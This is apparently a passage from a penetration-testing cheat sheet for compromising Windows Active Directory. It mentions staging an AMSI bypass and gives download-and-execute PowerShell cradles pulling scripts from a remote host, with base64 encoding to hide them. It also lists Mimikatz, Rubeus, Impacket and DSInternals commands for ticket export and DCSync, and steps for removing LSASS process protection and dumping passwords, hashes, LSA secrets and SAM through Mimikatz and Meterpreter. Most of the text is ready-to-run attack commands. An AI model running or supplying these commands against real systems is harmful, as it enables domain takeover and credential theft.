Bypass folder of web server will have AMSI bypass splitted and loaded in parts, then, run whatever payload chosen.
### Powershell useful commands
```
# Load script to memory
(New-Object System.Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1') | iex
IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')

# Create credential object
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

# Encoded command
$string = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')"
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
```

### Unconstrained Delegation
```
# Export Kerberos tickets from memory
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'

# Monitor Kerberos tickets on unconstrained delegation machine
Invoke-Rubeus -Command "monitor /internal:5"
```

### DCSync
```
# Using Mimikatz
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:infinity.com /all"'

# Using Impacket:
proxychains -q python examples/secretsdump.py tricky.com/sqlsvc:123456@172.16.184.150
proxychains -q python examples/secretsdump.py tricky.com/sqlsvc@172.16.184.150 -hashes aad3b435b51404eeaad3b435b51404ee:[NTHash]

# Using DSInternals
- Download the current release from GitHub.
- Unblock the ZIP file, using either the Properties dialog or the Unblock-File cmdlet. If you fail to do so, all the extracted DLLs will inherit this attribute and PowerShell will refuse to load them.
- Extract the DSInternals directory to your PowerShell modules directory, e.g. C:\Windows\system32\WindowsPowerShell\v1.0\Modules\DSInternals or C:\Users\John\Documents\WindowsPowerShell\Modules\DSInternals.
- (Optional) If you copied the module to a different directory than advised in the previous step, you have to manually import it using the Import-Module cmdlet.
Get-ADReplAccount -All -Server 'dc01.contoso.com'
```

### Credentials Theft
```
# Dump credentials with PPL using Mimikatz
iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimikatz.exe -OutFile mimikatz.exe
iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimidrv.sys -OutFile mimidrv.sys
.\mimikatz.exe
log
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
exit

# Meterpreter
load kiwi
getsystem
creds_all
lsa_dump_secrets
lsa_dump_sam
```
